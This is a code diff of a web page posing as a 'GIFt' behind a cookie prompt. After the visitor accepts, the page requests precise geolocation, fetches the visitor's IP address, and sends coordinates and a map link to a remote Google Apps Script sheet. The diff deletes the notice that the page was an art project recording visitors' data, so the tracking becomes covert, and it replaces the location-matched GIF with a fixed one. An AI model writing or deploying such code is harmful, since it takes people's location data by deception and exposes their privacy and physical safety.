@@ -100,35 +100,6 @@
             margin-top: 20px;
             display: none;
         }
-        #debug-panel {
-            text-align: left;
-            border: 1px solid #ddd;
-            padding: 10px;
-            margin-top: 20px;
-            background-color: #f8f8f8;
-            border-radius: 5px;
-            font-family: monospace;
-            font-size: 12px;
-            max-height: 200px;
-            overflow-y: auto;
-        }
-        #debug-panel h3 {
-            margin-top: 0;
-        }
-        .debug-log {
-            margin: 5px 0;
-            padding: 3px;
-            border-bottom: 1px solid #eee;
-        }
-        .debug-success {
-            color: green;
-        }
-        .debug-error {
-            color: red;
-        }
-        .debug-info {
-            color: blue;
-        }
     </style>
 </head>
 <body>
@@ -159,17 +130,9 @@
         <h1>Here's Your GIFt!</h1>
         <p>Enjoy this special moment from near you:</p>
         <div id="gif-container"></div>
-        <p>Thank you for participating in our "techno-feudalism" awareness project.</p>
-        <p>Your data has been recorded as part of this art installation.</p>
-        <p id="data-value">Your data's estimated black market value: $<span id="market-value">0000</span></p>
     </div>
 
     <div id="error-message">ERROR: Please go back and accept to continue.</div>
-    
-    <div id="debug-panel" style="display: block;">
-        <h3>Debug Information:</h3>
-        <div id="debug-log"></div>
-    </div>
 
     <div id="terms-modal" class="modal">
         <div class="modal-content">
@@ -193,30 +156,6 @@
     </div>
 
     <script>
-        // Debug function to help trace issues
-        function debugLog(message, type = "info") {
-            const debugLog = document.getElementById('debug-log');
-            const logEntry = document.createElement('div');
-            logEntry.className = `debug-log debug-${type}`;
-            
-            // Add timestamp
-            const now = new Date();
-            const timestamp = now.toTimeString().split(' ')[0] + '.' + now.getMilliseconds().toString().padStart(3, '0');
-            
-            logEntry.textContent = `[${timestamp}] ${message}`;
-            debugLog.appendChild(logEntry);
-            
-            // Auto-scroll to bottom
-            debugLog.scrollTop = debugLog.scrollHeight;
-            
-            // Also log to console
-            console.log(`[${type.toUpperCase()}] ${message}`);
-        }
-
-        // Start debugging information
-        debugLog("Page loaded successfully", "success");
-        debugLog("Browser: " + navigator.userAgent, "info");
-
         // Global variables
         let userLatitude = null;
         let userLongitude = null;
@@ -226,26 +165,22 @@
         const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw_lbi-r1iLkrDMpnMp5dJe8jXx1zvL926AolpnC6y9idJJp6v3k5MNY3xo4jNP_Jh8/exec";
 
         // Get user IP address
-        debugLog("Fetching IP address...", "info");
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
                 userIP = data.ip;
-                debugLog("IP address obtained: " + userIP, "success");
             })
             .catch(error => {
-                debugLog("Error getting IP: " + error, "error");
+                console.error('Error getting IP:', error);
             });
 
         // Button and screen handlers
         document.getElementById('accept-cookies').addEventListener('click', function() {
-            debugLog("Cookies accepted", "info");
             document.getElementById('welcome-screen').style.display = 'none';
             document.getElementById('location-screen').style.display = 'block';
             
             // Automatically request location
             if (navigator.geolocation) {
-                debugLog("Requesting geolocation from browser...", "info");
                 navigator.geolocation.getCurrentPosition(
                     handleLocationSuccess, 
                     handleLocationError,
@@ -256,13 +191,11 @@
                     }
                 );
             } else {
-                debugLog("Geolocation not supported by browser", "error");
                 showError();
             }
         });
 
         document.getElementById('decline-cookies').addEventListener('click', function() {
-            debugLog("Cookies declined", "info");
             showError();
         });
 
@@ -272,18 +205,15 @@
         const closeBtn = document.getElementsByClassName('close')[0];
 
         termsLink.addEventListener('click', function() {
-            debugLog("Terms modal opened", "info");
             modal.style.display = 'block';
         });
 
         closeBtn.addEventListener('click', function() {
-            debugLog("Terms modal closed", "info");
             modal.style.display = 'none';
         });
 
         window.addEventListener('click', function(event) {
             if (event.target === modal) {
-                debugLog("Terms modal closed (clicked outside)", "info");
                 modal.style.display = 'none';
             }
         });
@@ -293,34 +223,28 @@
             userLatitude = position.coords.latitude;
             userLongitude = position.coords.longitude;
             
-            debugLog(`Location obtained: ${userLatitude}, ${userLongitude}`, "success");
-            
             // Generate random "market value" between $1000-$9999
             const marketValue = Math.floor(Math.random() * 9000) + 1000;
-            document.getElementById('market-value').textContent = marketValue;
-            
-            debugLog(`Market value generated: $${marketValue}`, "info");
             
             // Show loading screen
             document.getElementById('location-screen').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
             
-            // Search for GIF based on location
-            searchLocationGif(userLatitude, userLongitude);
+            // Get Sydney Opera House GIF
+            getSydneyOperaHouseGif();
             
-            // Send data to Google Sheet using JSONP (the method that worked)
+            // Send data to Google Sheet using JSONP
             sendDataToGoogleSheet(userLatitude, userLongitude, marketValue);
         }
 
         // Handle location error
         function handleLocationError(error) {
-            debugLog(`Location error: ${error.code} - ${error.message}`, "error");
+            console.error(`Location error: ${error.code} - ${error.message}`);
             showError();
         }
 
         // Show error message
         function showError() {
-            debugLog("Showing error message", "info");
             document.getElementById('welcome-screen').style.display = 'none';
             document.getElementById('location-screen').style.display = 'none';
             document.getElementById('loading').style.display = 'none';
@@ -329,82 +253,49 @@
             
             // Return to welcome screen after 3 seconds
             setTimeout(function() {
-                debugLog("Returning to welcome screen", "info");
                 document.getElementById('error-message').style.display = 'none';
                 document.getElementById('welcome-screen').style.display = 'block';
             }, 3000);
         }
 
-        // Search for location-related GIF
-        function searchLocationGif(latitude, longitude) {
-            debugLog("Searching for location-related GIF...", "info");
-            // Reverse geocode to get location name
-            debugLog(`Reverse geocoding coordinates: ${latitude}, ${longitude}`, "info");
-            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=10`)
-                .then(response => {
-                    debugLog("Reverse geocoding response received", "success");
-                    return response.json();
-                })
-                .then(data => {
-                    let locationName = "Unknown location";
-                    
-                    // Try to get a landmark or location name
-                    if (data.address) {
-                        if (data.address.city) {
-                            locationName = data.address.city;
-                        } else if (data.address.town) {
-                            locationName = data.address.town;
-                        } else if (data.address.suburb) {
-                            locationName = data.address.suburb;
-                        }
-                    }
-                    
-                    debugLog(`Location name determined: ${locationName}`, "info");
-                    
-                    // Search Giphy for related GIF
-                    debugLog(`Searching Giphy for: ${locationName}`, "info");
-                    return fetch(`https://api.giphy.com/v1/gifs/search?api_key=${GIPHY_API_KEY}&q=${encodeURIComponent(locationName)}&limit=5&rating=g`);
-                })
-                .then(response => {
-                    debugLog("Giphy API response received", "success");
-                    return response.json();
-                })
+        // Get Sydney Opera House GIF
+        function getSydneyOperaHouseGif() {
+            // Search specifically for Sydney Opera House GIFs
+            fetch(`https://api.giphy.com/v1/gifs/search?api_key=${GIPHY_API_KEY}&q=sydney+opera+house&limit=10&rating=g`)
+                .then(response => response.json())
                 .then(data => {
                     if (data.data && data.data.length > 0) {
                         // Get a random GIF from the results
-                        const randomIndex = Math.floor(Math.random() * Math.min(data.data.length, 5));
+                        const randomIndex = Math.floor(Math.random() * Math.min(data.data.length, 10));
                         const gifUrl = data.data[randomIndex].images.fixed_height.url;
-                        debugLog(`GIF found: ${gifUrl}`, "success");
                         displayGif(gifUrl);
                     } else {
-                        debugLog("No specific location GIFs found, falling back to generic location GIF", "info");
-                        // Fall back to a generic "location" GIF
-                        return fetch(`https://api.giphy.com/v1/gifs/search?api_key=${GIPHY_API_KEY}&q=location&limit=5&rating=g`);
-                    }
-                })
-                .then(response => {
-                    if (response) {
-                        debugLog("Generic location search response received", "success");
-                        return response.json();
-                    }
-                })
-                .then(data => {
-                    if (data && data.data && data.data.length > 0) {
-                        const randomIndex = Math.floor(Math.random() * Math.min(data.data.length, 5));
-                        const gifUrl = data.data[randomIndex].images.fixed_height.url;
-                        debugLog(`Generic location GIF found: ${gifUrl}`, "success");
-                        displayGif(gifUrl);
+                        // Fallback to Sydney if no Opera House GIFs
+                        fetch(`https://api.giphy.com/v1/gifs/search?api_key=${GIPHY_API_KEY}&q=sydney&limit=10&rating=g`)
+                            .then(response => response.json())
+                            .then(data => {
+                                if (data.data && data.data.length > 0) {
+                                    const randomIndex = Math.floor(Math.random() * Math.min(data.data.length, 10));
+                                    const gifUrl = data.data[randomIndex].images.fixed_height.url;
+                                    displayGif(gifUrl);
+                                } else {
+                                    showError();
+                                }
+                            })
+                            .catch(error => {
+                                console.error('Error getting fallback GIF:', error);
+                                showError();
+                            });
                     }
                 })
                 .catch(error => {
-                    debugLog(`Error getting GIF: ${error}`, "error");
+                    console.error('Error getting GIF:', error);
                     showError();
                 });
         }
 
         // Display GIF
         function displayGif(gifUrl) {
-            debugLog("Displaying GIF", "info");
             const gifContainer = document.getElementById('gif-container');
             const img = document.createElement('img');
             img.src = gifUrl;
@@ -417,19 +308,16 @@
             document.getElementById('gift-screen').style.display = 'block';
         }
 
-        // Send data to Google Sheet using JSONP (the method that worked)
+        // Send data to Google Sheet using JSONP
         function sendDataToGoogleSheet(latitude, longitude, marketValue) {
             const timestamp = new Date().toISOString();
             const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-            
-            debugLog("Sending data to Google Sheet via JSONP...", "info");
             
             // Create a unique callback name
             const callbackName = 'googleScriptCallback_' + new Date().getTime();
             
             // Create a global callback function
             window[callbackName] = function(response) {
-                debugLog(`Data sent successfully: ${JSON.stringify(response)}`, "success");
                 // Clean up by removing script and callback function
                 delete window[callbackName];
             };
@@ -450,14 +338,12 @@
             
             // Handle timeout
             const timeoutId = setTimeout(function() {
-                debugLog("Data submission timed out, but the GIF will still be shown", "error");
                 document.body.removeChild(script);
                 delete window[callbackName];
             }, 10000);
             
             // Handle script load error
             script.onerror = function() {
-                debugLog("Data submission error, but the GIF will still be shown", "error");
                 clearTimeout(timeoutId);
                 document.body.removeChild(script);
                 delete window[callbackName];
